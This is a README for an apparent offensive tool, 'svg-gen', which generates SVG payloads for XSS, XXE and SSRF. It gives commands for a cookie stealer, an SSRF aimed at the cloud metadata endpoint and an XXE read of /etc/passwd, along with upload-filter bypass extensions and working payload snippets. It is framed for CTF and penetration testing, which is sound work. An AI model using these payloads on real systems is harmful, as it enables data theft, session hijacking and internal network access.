# svg-gen

SVG payload generator for XSS, XXE, and SSRF attacks.

## Installation

```bash
cargo build --release
# Binary: target/release/svg-gen
```

## Usage

### SVG XSS Payloads

```bash
# Show all XSS payloads
svg-gen xss

# Save specific payload to file
svg-gen xss -i 0 -o xss.svg
```

Includes:
- onload XSS
- script tag XSS
- foreignObject XSS
- animate/set XSS
- image onerror XSS

### SVG XXE Payloads

```bash
# Show XXE payloads
svg-gen xxe

# Save to file
svg-gen xxe -o xxe.svg
```

Includes:
- File read via external entity
- SSRF via XXE
- Parameter entity XXE

### SVG SSRF Payloads

```bash
# Show SSRF payloads
svg-gen ssrf

# Save to file
svg-gen ssrf -o ssrf.svg
```

Includes:
- External image SSRF
- External stylesheet SSRF
- Use element SSRF

### Generate Custom Payloads

#### Custom XSS

```bash
svg-gen generate xss "alert(document.cookie)" -o cookie_stealer.svg
```

#### Custom SSRF

```bash
svg-gen generate ssrf "http://169.254.169.254/latest/meta-data/" -o aws_metadata.svg
```

#### Custom XXE

```bash
svg-gen generate xxe "/etc/passwd" -o file_read.svg
```

### Cross-Site Imaging

Advanced payloads for data exfiltration:

```bash
svg-gen imaging
```

Includes:
- Cookie stealing
- Keylogger
- Form hijacking

### Upload Bypass

Get Content-Types and extensions for bypassing upload filters:

```bash
svg-gen bypass
```

Shows:
- Content-Types: `image/svg+xml`, `image/png`, etc.
- Extensions: `.svg`, `.svg.png`, `.svg%00.png`, etc.

### Juice Shop Challenge

```bash
# Show payload
svg-gen juice-shop

# Save to file
svg-gen juice-shop -o exploit.svg
```

## SVG Attack Vectors

### XSS via SVG

SVG files can contain JavaScript:
```xml
<svg onload="alert('XSS')">
<svg><script>alert('XSS')</script></svg>
```

### XXE via SVG

SVG is XML, so XXE is possible:
```xml
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg><text>&xxe;</text></svg>
```

### SSRF via SVG

SVG can load external resources:
```xml
<svg>
  <image href="http://internal:8080/"/>
</svg>
```

## Use Cases

### CTF Challenges
- Juice Shop Cross-Site Imaging
- File upload challenges
- XXE via image upload

### Security Testing
- Test SVG upload handling
- Image processing vulnerabilities
- CSP bypass via SVG

### Penetration Testing
- File upload exploitation
- SSRF via image processing
- XXE in document converters
